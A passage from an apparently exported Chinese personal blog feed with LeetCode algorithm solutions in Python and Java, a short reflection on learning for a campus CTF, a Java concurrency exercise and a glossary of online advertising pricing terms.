<h2 id="解法1—斐波那契"><a href="#解法1—斐波那契" class="headerlink" title="解法1—斐波那契"></a>解法1—斐波那契</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">climbStairs</span>(<span class="params">self, n</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        :type n: int</span></span><br><span class="line"><span class="string">        :rtype: int</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        a = <span class="number">0</span></span><br><span class="line">        b = <span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">            <span class="built_in">print</span>(b)</span><br><span class="line">            a,b = b,a+b</span><br><span class="line">        <span class="keyword">return</span> b</span><br></pre></td></tr></table></figure>

<h2 id="解法2"><a href="#解法2" class="headerlink" title="解法2"></a>解法2</h2><p>执行用时: 52 ms, 在Climbing Stairs的Python3提交中击败了15.27% 的用户，神仙也太多了吧，想个好点的，怎么也要超过30%，哭了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">climbStairs</span>(<span class="params">self, n</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        :type n: int</span></span><br><span class="line"><span class="string">        :rtype: int</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> n == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> n == <span class="number">2</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">2</span></span><br><span class="line">        res = [<span class="number">1</span>, <span class="number">2</span>]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, n):</span><br><span class="line">            res.append(res[i - <span class="number">1</span>] + res[i - <span class="number">2</span>])</span><br><span class="line">        <span class="keyword">return</span> res[-<span class="number">1</span>]</span><br></pre></td></tr></table></figure>

<p>其实思想是一样的，只不过少了很多次的解包操作，可以快很多，但我自己看上一种办法更爽</p>
]]></content>
      <tags>
        <tag>python</tag>
        <tag>leetcode</tag>
      </tags>
  </entry>
  <entry>
    <title>My first blog</title>
    <url>/2019/01/29/my-first-blog/</url>
    <content><![CDATA[<p>一个Rookie的心声<br></p>
<span id="more"></span>

<p>在参加校内ctf练习赛hgame 2019 week1的时间里，觉得自己不会的很多<br><br>虽然可能有些人知道pwn我可能提前看了快两个月，也提前看过一些汇编，可是实际操作起来举步艰难<br><br>可能的确这方面没有太多的灵性，但是一步步过来，对我自己而言有些进步就好<br><br>这个期末附近开始接触前端，还是发现自己的知识面几乎为0，html5+js+css 都需要从头慢慢看起来<br><br>可是寒假因为有hgame ctf的安全方面只是想学习，所以真的挺累的，导致自己可能看个 canvas 的基础操作模拟例子都要废好久的功夫<br><br>也许进步很缓慢，但总算是有进步的<br><br>接下来要写wp，markdown的语法也要从0捡起来<br><br>事情很多，要请教的人多，要学习的知识很多<br><br>我语文真的很不好，就说到这里吧<br><br>希望各自忙碌努力的大家能开开心心的过年<br></p>
]]></content>
      <tags>
        <tag>me</tag>
      </tags>
  </entry>
  <entry>
    <title>leetcode_环形链表1/2</title>
    <url>/2019/02/27/leetcode-%E7%8E%AF%E5%BD%A2%E9%93%BE%E8%A1%A81-2/</url>
    <content><![CDATA[<p>准备考研之际，看看环形链表换换脑子</p>
<span id="more"></span>

<h2 id="环形链表"><a href="#环形链表" class="headerlink" title="环形链表"></a>环形链表</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>给定一个链表，判断链表中是否有环。</p>
<p>为了表示给定链表中的环，我们使用整数 <code>pos</code> 来表示链表尾连接到链表中的位置（索引从 0 开始）。 如果 <code>pos</code> 是 <code>-1</code>，则在该链表中没有环。</p>
<p><strong>示例 1：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：head = [3,2,0,-4], pos = 1</span><br><span class="line">输出：true</span><br><span class="line">解释：链表中有一个环，其尾部连接到第二个节点。</span><br></pre></td></tr></table></figure>

<p><img src="https://assets.leetcode-cn.com/aliyun-lc-upload/uploads/2018/12/07/circularlinkedlist.png" alt="img"></p>
<p><strong>示例 2：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：head = [1,2], pos = 0</span><br><span class="line">输出：true</span><br><span class="line">解释：链表中有一个环，其尾部连接到第一个节点。</span><br></pre></td></tr></table></figure>

<p><img src="https://assets.leetcode-cn.com/aliyun-lc-upload/uploads/2018/12/07/circularlinkedlist_test2.png" alt="img"></p>
<p><strong>示例 3：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：head = [1], pos = -1</span><br><span class="line">输出：false</span><br><span class="line">解释：链表中没有环。</span><br></pre></td></tr></table></figure>

<p><img src="https://assets.leetcode-cn.com/aliyun-lc-upload/uploads/2018/12/07/circularlinkedlist_test3.png" alt="img"></p>
<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>感觉讲的还是蛮清楚的，这里有个知识点，就是快慢指针法，我们设想两个人绕着操场跑步，快的早晚会套圈的，如果是环形链表，类似，快指针早晚会追上慢指针的</p>
<h3 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">hasCycle</span>(<span class="params">self, head</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        :type head: ListNode</span></span><br><span class="line"><span class="string">        :rtype: bool</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> head:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        first = head</span><br><span class="line">        second = head</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">if</span> first.<span class="built_in">next</span> <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> first.<span class="built_in">next</span>.<span class="built_in">next</span> <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">            first = first.<span class="built_in">next</span>.<span class="built_in">next</span></span><br><span class="line">            second = second.<span class="built_in">next</span></span><br><span class="line">            <span class="keyword">if</span> first == second:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">True</span></span><br></pre></td></tr></table></figure>

<h2 id="环形链表II"><a href="#环形链表II" class="headerlink" title="环形链表II"></a>环形链表II</h2><h3 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h3><p>无非多了一个条件，不能修改链表，我们之前的做法就不可以了</p>
<h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p>我们之前深度遍历用了list，这里感觉也是可以的</p>
<h3 id="解法-1"><a href="#解法-1" class="headerlink" title="解法"></a>解法</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">detectCycle</span>(<span class="params">self, head</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        :type head: ListNode</span></span><br><span class="line"><span class="string">        :rtype: ListNode</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        nodeList = []</span><br><span class="line">        <span class="keyword">while</span> head:</span><br><span class="line">            <span class="keyword">if</span> head <span class="keyword">in</span> nodeList:</span><br><span class="line">                <span class="keyword">return</span> head</span><br><span class="line">            nodeList.append(head)</span><br><span class="line">            head = head.<span class="built_in">next</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>python</tag>
        <tag>leetcode</tag>
      </tags>
  </entry>
  <entry>
    <title>leetcode_整数反转/回文数/最长公共前缀</title>
    <url>/2019/02/06/leetcode-%E6%95%B4%E6%95%B0%E5%8F%8D%E8%BD%AC-%E5%9B%9E%E6%96%87%E6%95%B0-%E6%9C%80%E9%95%BF%E5%85%AC%E5%85%B1%E5%89%8D%E7%BC%80/</url>
    <content><![CDATA[<p>起得太晚了，看个简单的清醒一下</p>
<span id="more"></span>

<h2 id="整数反转"><a href="#整数反转" class="headerlink" title="整数反转"></a>整数反转</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>给出一个 32 位的有符号整数，你需要将这个整数中每位上的数字进行反转。</p>
<p><strong>示例 1:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入: 123</span><br><span class="line">输出: 321</span><br></pre></td></tr></table></figure>

<p> <strong>示例 2:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入: -123</span><br><span class="line">输出: -321</span><br></pre></td></tr></table></figure>

<p><strong>示例 3:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入: 120</span><br><span class="line">输出: 21</span><br></pre></td></tr></table></figure>

<p><strong>注意:</strong></p>
<p>假设我们的环境只能存储得下 32 位的有符号整数，则其数值范围为 [−2^31,  2^31 − 1]。请根据这个假设，如果反转后整数溢出那么就返回 0。</p>
<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>感觉最好的办法就是换成字符串来操作，python3对int和str的切换的方法还是很多的</p>
<h3 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">reverse</span>(<span class="params">self, x</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        :type x: int</span></span><br><span class="line"><span class="string">        :rtype: int</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> x == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        s = <span class="built_in">str</span>(x)</span><br><span class="line">        <span class="keyword">if</span> s[<span class="number">0</span>] == <span class="string">&#x27;-&#x27;</span>:</span><br><span class="line">            flag += <span class="string">&#x27;-&#x27;</span></span><br><span class="line">        flag += s[<span class="built_in">len</span>(s)-<span class="number">1</span>::-<span class="number">1</span>].rstrip(<span class="string">&#x27;-&#x27;</span>).lstrip(<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">        x = <span class="built_in">int</span>(flag)</span><br><span class="line">        <span class="keyword">if</span> -<span class="number">2</span>**<span class="number">31</span>&lt;x&lt;<span class="number">2</span>**<span class="number">31</span>-<span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> x</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br></pre></td></tr></table></figure>

<p>还是蛮简单的一个，热热手吧，但是看了之后熟悉一下str的strip操作也蛮好的</p>
<h2 id="回文数"><a href="#回文数" class="headerlink" title="回文数"></a>回文数</h2><h3 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h3><p>判断一个整数是否是回文数。回文数是指正序（从左向右）和倒序（从右向左）读都是一样的整数。</p>
<p><strong>示例 1:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入: 121</span><br><span class="line">输出: true</span><br></pre></td></tr></table></figure>

<p><strong>示例 2:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入: -121</span><br><span class="line">输出: false</span><br><span class="line">解释: 从左向右读, 为 -121 。 从右向左读, 为 121- 。因此它不是一个回文数。</span><br></pre></td></tr></table></figure>

<p><strong>示例 3:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入: 10</span><br><span class="line">输出: false</span><br><span class="line">解释: 从右向左读, 为 01 。因此它不是一个回文数。</span><br></pre></td></tr></table></figure>

<h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p>这题字面意思，只需要判断，不需要输出，还是比较容易想的，可能是之前拿C写过类似的吧，因为输入的是整数，用字符串很棒，因为可以用索引</p>
<h3 id="解题-1"><a href="#解题-1" class="headerlink" title="解题"></a>解题</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">isPalindrome</span>(<span class="params">self, x</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        :type x: int</span></span><br><span class="line"><span class="string">        :rtype: bool</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        s1 = <span class="built_in">str</span>(x)</span><br><span class="line">        s2 = s1[<span class="built_in">len</span>(s1)-<span class="number">1</span>::-<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s1)):</span><br><span class="line">            <span class="keyword">if</span> s1[i] != s2[i]:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br></pre></td></tr></table></figure>

<h2 id="最长公共前缀"><a href="#最长公共前缀" class="headerlink" title="最长公共前缀"></a>最长公共前缀</h2><h3 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h3><p>编写一个函数来查找字符串数组中的最长公共前缀。</p>
<p>如果不存在公共前缀，返回空字符串 <code>&quot;&quot;</code>。</p>
<p><strong>示例 1:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入: [&quot;flower&quot;,&quot;flow&quot;,&quot;flight&quot;]</span><br><span class="line">输出: &quot;fl&quot;</span><br></pre></td></tr></table></figure>

<p><strong>示例 2:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入: [&quot;dog&quot;,&quot;racecar&quot;,&quot;car&quot;]</span><br><span class="line">输出: &quot;&quot;</span><br><span class="line">解释: 输入不存在公共前缀。</span><br></pre></td></tr></table></figure>

<p><strong>说明:</strong></p>
<p>所有输入只包含小写字母 <code>a-z</code> 。</p>
<h3 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h3><p>还是不难吧，是按照list输入的，最开始的想法是只要遍历就可以了</p>
<h3 id="解题-2"><a href="#解题-2" class="headerlink" title="解题"></a>解题</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">longestCommonPrefix</span>(<span class="params">self, strs</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        :type strs: List[str]</span></span><br><span class="line"><span class="string">        :rtype: str</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;&#x27;</span> <span class="keyword">in</span> strs <span class="keyword">or</span> <span class="built_in">len</span>(strs) == <span class="number">0</span> <span class="keyword">or</span> strs[<span class="number">0</span>] == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> flag</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(strs[<span class="number">0</span>])):</span><br><span class="line">            temp = strs[<span class="number">0</span>][i]</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(strs)):</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">len</span>(strs[j])&lt;i+<span class="number">1</span>:</span><br><span class="line">                    <span class="keyword">return</span> flag</span><br><span class="line">                <span class="keyword">if</span> temp != strs[j][i]:</span><br><span class="line">                    <span class="keyword">return</span> flag</span><br><span class="line">            flag += temp</span><br><span class="line">        <span class="keyword">return</span> flag</span><br></pre></td></tr></table></figure>

<p>可能不是最快的，但可能是最容易想到的，最直观的吧，二叉树什么的暂时还没用上，不过要疯狂的注意数组越界问题</p>
]]></content>
      <tags>
        <tag>python</tag>
        <tag>leetcode</tag>
      </tags>
  </entry>
  <entry>
    <title>互联网广告专业术语大盘点</title>
    <url>/2021/07/12/%E4%BA%92%E8%81%94%E7%BD%91%E5%B9%BF%E5%91%8A%E4%BB%98%E8%B4%B9%E6%A8%A1%E5%BC%8F%E4%B8%93%E4%B8%9A%E6%9C%AF%E8%AF%AD%E5%A4%A7%E7%9B%98%E7%82%B9/</url>
    <content><![CDATA[<p>了解一些互联网广告的专业术语以及概念。</p>
<span id="more"></span>

<h2 id="付费模式"><a href="#付费模式" class="headerlink" title="付费模式"></a>付费模式</h2><p><a href="https://www.huaweicloud.com/articles/5554bc0d0477f70083b44bf830631a08.html">华为云链接</a></p>
<p><img src="https://res-static.hc-cdn.cn/fms/img/6088b2a6472d9b5449e2a9707e5aaea31603764640674" alt="互联网广告付费模式专业术语大盘点：CPC、CPM、CPT……1"></p>
<p>每点击成本/每千人点击成本，是一种点击付费广告，根据广告被点击的次数收费。</p>
<p><img src="https://res-static.hc-cdn.cn/fms/img/eb9a589df190f0b9c7053031f4e1cd2b1603764640677" alt="互联网广告付费模式专业术语大盘点：CPC、CPM、CPT……2"></p>
<p>每千人成本，是一种展示付费广告，只要展示了广告主的广告内容，广告主就为此付费。</p>
<p><img src="https://res-static.hc-cdn.cn/fms/img/c7851e5affb2068ebfca708f5078a3c41603764640677" alt="互联网广告付费模式专业术语大盘点：CPC、CPM、CPT……3"></p>
<p>每时间段成本，是一种以时间来计费的广告，国内很多的网站都是按照“一个星期多少钱”这种固定收费模式来收费。</p>
<p><img src="https://res-static.hc-cdn.cn/fms/img/8879bddced73ea6ee06458126d632a0a1603764640677" alt="互联网广告付费模式专业术语大盘点：CPC、CPM、CPT……4"></p>
<p>每行动成本，是一种按广告投放实际效果计价方式的广告，即按回应的有效问卷或注册来计费，而不限广告投放量。</p>
<p><img src="https://res-static.hc-cdn.cn/fms/img/c0a2cff3aabb5a141cfa25f63779100b1603764640678" alt="互联网广告付费模式专业术语大盘点：CPC、CPM、CPT……5"></p>
<p>每下载成本，按用户完成APP下载计费，在应用商店、积分墙、流量联盟比较常见。</p>
<p><img src="https://res-static.hc-cdn.cn/fms/img/8fcddfaea1e3841ac4d306663f5dc0db1603764640678" alt="互联网广告付费模式专业术语大盘点：CPC、CPM、CPT……6"></p>
<p>每安装成本，按用户激活APP计费，渠道按这种模式结算比较少，通常只作为广告主内部衡量广告投放效果的指标之一。</p>
<p><img src="https://res-static.hc-cdn.cn/fms/img/627ae0de3cafbf6d3bcf01861a911fc61603764640678" alt="互联网广告付费模式专业术语大盘点：CPC、CPM、CPT……7"></p>
<p>以实际销售产品数量来换算广告刊登金额，是一种以实际销售产品数量来计算广告费用的广告，这种广告更多的适合购物类、导购类、网址导航类的网站，需要精准的流量才能带来转化。</p>
<p><img src="https://res-static.hc-cdn.cn/fms/img/7c6487e2f7d73cb9c49dd86c6b5dbd891603764640678" alt="互联网广告付费模式专业术语大盘点：CPC、CPM、CPT……8"></p>
<p>每回应成本，以浏览者的每一个回应计费，这种广告计费充分体现了网络广告“及时反应、直接互动、准确记录”的特点。</p>
<p><img src="https://res-static.hc-cdn.cn/fms/img/4887bd97134cc192d0fd01e6338da0991603764640679" alt="互联网广告付费模式专业术语大盘点：CPC、CPM、CPT……9"></p>
<p>每购买成本，广告主为规避广告费用风险，只有在网络用户点击旗帜广告并进行在线交易后，才按销售笔数付给广告站点费用。</p>
<p><img src="https://res-static.hc-cdn.cn/fms/img/8332a0b3b0e20066cc263a935f826aee1603764640679" alt="互联网广告付费模式专业术语大盘点：CPC、CPM、CPT……10"></p>
<p>展示广告按展示付费，又称富媒体广告，按展示付费，即按投放广告网站的被展示次数计费，网站被打开一次计一次费，按千次IP计费。</p>
<p><img src="https://res-static.hc-cdn.cn/fms/img/370a913eca45220ba803d7a30476624d1603764640679" alt="互联网广告付费模式专业术语大盘点：CPC、CPM、CPT……11"></p>
<p>以搜集潜在客户名单多少来收费，即每次通过特定链接，进行应答询问或调查、提供其它信息、注册会员等等事先约定的事宜时，向联盟会员支付事先约定佣金费用的方式。注册成功后付费的一个常见广告模式。这是我们通常称谓的引导注册，比如“亚洲交友”。</p>
<p><img src="https://res-static.hc-cdn.cn/fms/img/f19e438207e6bd5dbec13725c63309f11603764640679" alt="互联网广告付费模式专业术语大盘点：CPC、CPM、CPT……12"></p>
<p>按业绩付费，是一项基于在线市场服务的新业务,与公司传统的在线广告模式相比,此项新业务具有更高的投资回报。</p>
]]></content>
      <tags>
        <tag>互联网广告</tag>
      </tags>
  </entry>
  <entry>
    <title>多线程--力扣合集</title>
    <url>/2021/08/06/%E5%A4%9A%E7%BA%BF%E7%A8%8B--%E5%8A%9B%E6%89%A3%E5%90%88%E9%9B%86/</url>
    <content><![CDATA[<p>ing</p>
<span id="more"></span>

<h2 id="1279-红绿灯路口"><a href="#1279-红绿灯路口" class="headerlink" title="1279. 红绿灯路口"></a><a href="https://leetcode-cn.com/problems/traffic-light-controlled-intersection/">1279. 红绿灯路口</a></h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TrafficLight</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">TrafficLight</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">boolean</span> road1IsGreen = <span class="keyword">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">carArrived</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">            <span class="keyword">int</span> carId,           // ID of the car</span></span></span><br><span class="line"><span class="params"><span class="function">            <span class="keyword">int</span> roadId,          // ID of the road the car travels on. Can be <span class="number">1</span> (road A)</span> or 2 <span class="params">(road B)</span></span></span><br><span class="line"><span class="function">            <span class="keyword">int</span> direction,       <span class="comment">// Direction of the car</span></span></span><br><span class="line"><span class="function">            Runnable turnGreen,  <span class="comment">// Use turnGreen.run() to turn light to green on current road</span></span></span><br><span class="line"><span class="function">            Runnable crossCar    <span class="comment">// Use crossCar.run() to make car cross the intersection</span></span></span><br><span class="line"><span class="function">    ) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> ((roadId == <span class="number">1</span>) != road1IsGreen) &#123;</span><br><span class="line">            turnGreen.run();</span><br><span class="line">            road1IsGreen = !road1IsGreen;</span><br><span class="line">        &#125;</span><br><span class="line">        crossCar.run();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>一个很简单的例子，来让我回顾一下基础线程操作。</p>
]]></content>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>大数处理</title>
    <url>/2021/07/04/%E5%A4%A7%E6%95%B0%E5%A4%84%E7%90%86/</url>
    <content><![CDATA[<p>大数的处理是算法中很常见的问题，关键是笔试也容易考，记录一下常见的考法</p>
<span id="more"></span>

<h2 id="快速幂"><a href="#快速幂" class="headerlink" title="快速幂"></a>快速幂</h2><h3 id="leetcode-5802-统计好数字的数目"><a href="#leetcode-5802-统计好数字的数目" class="headerlink" title="leetcode 5802. 统计好数字的数目"></a>leetcode 5802. 统计好数字的数目</h3><h4 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h4><p>我们称一个数字字符串是 好数字 当它满足（下标从 0 开始）偶数 下标处的数字为 偶数 且 奇数 下标处的数字为 质数 （2，3，5 或 7）。</p>
<p>比方说，”2582” 是好数字，因为偶数下标处的数字（2 和 8）是偶数且奇数下标处的数字（5 和 2）为质数。但 “3245” 不是 好数字，因为 3 在偶数下标处但不是偶数。<br>给你一个整数 n ，请你返回长度为 n 且为好数字的数字字符串 总数 。由于答案可能会很大，请你将它对 10^9 + 7 取余后返回 。</p>
<p>一个 数字字符串 是每一位都由 0 到 9 组成的字符串，且可能包含前导 0 。</p>
<h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><p>关键是题目给的n特别大，遇到这种数字特别大的情况，需要考虑快速幂求解。</p>
<p>对于偶数下标处的数字，它可以为 0,2,4,6,8 共计 5 种，而长度为 n 的数字字符串有 ⌊(n+1)/2⌋个偶数下标.</p>
<p>对于奇数下标处的数字，它可以为 2,3,5,7 共计 4 种，而长度为 n 的数字字符串有 ⌊n/2⌋个奇数下标。</p>
<p>因此长度为 n 的数字字符串中，好数字的总数即为：5^⌊(n+1)/2⌋*4^⌊n/2⌋</p>
<p>在本题中，由于 n 的取值最大可以到 10^15，如果通过普通的乘法运算直接求出上式中的幂，会超出时间限制，因此我们需要使用快速幂算法对幂的求值进行优化。</p>
<h4 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">countGoodNumbers</span><span class="params">(<span class="keyword">long</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">int</span>) ((quickMul(<span class="number">5</span>,(n+<span class="number">1</span>)/<span class="number">2</span>)*quickMul(<span class="number">4</span>,n/<span class="number">2</span>))%(<span class="number">1000000000</span>+<span class="number">7</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">long</span> <span class="title">quickMul</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">long</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(n==<span class="number">0</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">long</span> y = quickMul(x, n / <span class="number">2</span>);</span><br><span class="line">        <span class="keyword">return</span> n % <span class="number">2</span> == <span class="number">0</span> ? y * y%(<span class="number">1000000000</span>+<span class="number">7</span>) : y * y * x%(<span class="number">1000000000</span>+<span class="number">7</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="全排列"><a href="#全排列" class="headerlink" title="全排列"></a>全排列</h2><h3 id="leetcode-面试题17-打印从-1-到最大的-n-位数"><a href="#leetcode-面试题17-打印从-1-到最大的-n-位数" class="headerlink" title="leetcode 面试题17. 打印从 1 到最大的 n 位数"></a>leetcode 面试题17. 打印从 1 到最大的 n 位数</h3><h4 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h4><p>输入数字 <code>n</code>，按顺序打印出从 1 到最大的 n 位十进制数。比如输入 3，则打印出 1、2、3 一直到最大的 3 位数 999</p>
<h4 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h4><p>本身其实不难，因为简单题所以时间复杂度要求不高，但是面试中多半会考虑大数的情况，所以需要使用全排列。</p>
<h4 id="题解-1"><a href="#题解-1" class="headerlink" title="题解"></a>题解</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> List&lt;Integer&gt; list;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span>[] printNumbers(<span class="keyword">int</span> n) &#123;</span><br><span class="line">        list = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">        dfs(n, <span class="number">0</span>, <span class="keyword">new</span> StringBuilder());</span><br><span class="line">        <span class="keyword">int</span>[] res = <span class="keyword">new</span> <span class="keyword">int</span>[list.size()];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; res.length; i++) &#123;</span><br><span class="line">            res[i] = list.get(i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> n, <span class="keyword">int</span> i, StringBuilder sb)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (i == n) &#123;</span><br><span class="line">            <span class="keyword">while</span> (sb.length() != <span class="number">0</span> &amp;&amp; sb.charAt(<span class="number">0</span>) == <span class="string">&#x27;0&#x27;</span>) &#123;</span><br><span class="line">                sb.deleteCharAt(<span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (sb.length() != <span class="number">0</span>) &#123;</span><br><span class="line">                list.add(Integer.valueOf(sb.toString()));</span><br><span class="line">            &#125;</span><br><span 